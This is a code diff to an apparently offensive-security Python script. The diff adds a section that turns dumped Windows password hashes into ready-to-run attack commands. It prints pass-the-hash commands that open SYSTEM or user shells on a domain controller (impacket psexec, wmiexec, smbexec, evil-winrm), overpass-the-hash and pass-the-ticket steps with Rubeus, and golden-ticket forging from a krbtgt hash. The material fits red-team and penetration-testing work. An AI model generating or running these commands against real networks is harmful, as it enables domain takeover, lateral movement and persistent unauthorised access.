@@ -209,6 +209,40 @@ def report(d, args):
             print(f"impacket-GetUserSPNs {dom}/{su}:'{p}' -dc-ip {dc} -request")
             print(f"nxc ldap {dc} -u {su} -p '{p}' -d {dom} --bloodhound --collection All --dns-server {dc}")
 
+        # ---- PtH exec: turn the RID-500 / admin hash into a shell ----
+        admin_hashes = [(u, nt) for (u, rid, nt, empty) in d["local_hashes"]
+                        if rid == "500" and not empty]
+        if admin_hashes:
+            print()
+            print(col("# --- PtH EXEC (local admin hash -> shell) ---", C['ok'], on))
+            for u, nt in admin_hashes:
+                print(col(f"# {u} (RID 500) — pass-the-hash to a shell:", C['dim'], on))
+                print(f"impacket-wmiexec -hashes :{nt} {dom}/{u}@{dc}     # semi-interactive, as the user")
+                print(f"impacket-psexec  -hashes :{nt} {dom}/{u}@{dc}     # SYSTEM (drops a service)")
+                print(f"impacket-smbexec -hashes :{nt} {dom}/{u}@{dc}     # SYSTEM, fileless-ish")
+                print(f"python3 scshell.py -hashes :{nt} {dom}/{u}@{dc} -service-name defragsvc   # fileless (needs a real svc)")
+                print(f"evil-winrm -i {dc} -u {u} -H {nt}                 # if WinRM open")
+                print()
+
+        # ---- Over-PtH / PtT: NTLM hash -> Kerberos ticket (Rubeus + impacket) ----
+        krbtgt = [nt for (u, rid, nt, empty) in d["local_hashes"] if u.lower() == "krbtgt"]
+        if admin_hashes or krbtgt:
+            print(col("# --- OVER-PtH / PASS-THE-TICKET ---", C['ok'], on))
+            if admin_hashes:
+                u, nt = admin_hashes[0]
+                print(col("# impacket (Kali): NTLM -> TGT -> use it", C['dim'], on))
+                print(f"impacket-getTGT -hashes :{nt} -dc-ip {dc} {dom}/{u}")
+                print(f"export KRB5CCNAME={u}.ccache && klist")
+                print(f"impacket-psexec -k -no-pass -dc-ip {dc} {dom}/{u}@<HOST_FQDN>")
+                print(col("# Rubeus (Windows): NTLM -> TGT -> ptt", C['dim'], on))
+                print(f".\\Rubeus.exe asktgt /user:{u} /rc4:{nt} /domain:{dom} /outfile:t.kirbi")
+                print(f".\\Rubeus.exe ptt /ticket:t.kirbi   # then klist to confirm")
+            if krbtgt:
+                print(col(f"# krbtgt hash present ({krbtgt[0]}) -> GOLDEN TICKET (need domain SID):", C['crit'], on))
+                print(f"impacket-lookupsid {dom}/<user>:'<pass>'@{dc} | grep 'Domain SID'")
+                print(f"impacket-ticketer -nthash {krbtgt[0]} -domain-sid <SID> -domain {dom} Administrator")
+                print(f".\\Rubeus.exe golden /rc4:{krbtgt[0]} /user:Administrator /domain:{dom} /sid:<SID> /ptt")
+
     # ---- crack commands (always emit if there's anything crackable) ----
     crackable_nt = [(u, nt) for (u, rid, nt, empty) in d["local_hashes"] if not empty]
     if crackable_nt or d["dcc2"]:
